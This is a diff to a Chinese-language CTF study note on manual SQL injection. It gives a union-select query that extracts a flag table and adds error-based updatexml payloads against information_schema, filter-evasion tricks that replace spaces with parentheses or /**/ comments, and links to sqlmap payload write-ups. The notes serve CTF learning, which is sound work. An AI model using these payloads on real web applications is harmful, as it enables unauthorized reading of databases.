@@ -7,7 +7,6 @@ categories: [100 Cyber security, 120 CTF, 121 Web ]
 ---
 
 ### 手注流程
-
 1. 页面里有一个POST表单，测试会不会有注入漏洞
     POST里
     id=1'和id=1'#
@@ -25,3 +24,18 @@ categories: [100 Cyber security, 120 CTF, 121 Web ]
 1. 查询数据：
     id=0' union select 1,2,3,skctf_flag from fl4g#
     得到flag。
+
+
+### 注入各种问题处理方法
+1. 提示输出信息超过一行：使用group_concat,eg:3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1
+1. 字符串超过group_concat限制，使用limit 0,1单独输出，limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）。
+ref：https://blog.csdn.net/forwardss/article/details/104682924
+1. 替代空格：
+    * 使用括号，eg：`3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1`
+    * 使用内联注释：`/**/`
+1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。
+
+### 其它资源
+1. sqlmap源码payload构成：https://www.anquanke.com/post/id/188173#h2-3
+1. https://cloud.tencent.com/developer/article/1669841
+1. https://www.yuque.com/vipkylin/vunko7/svhwwn
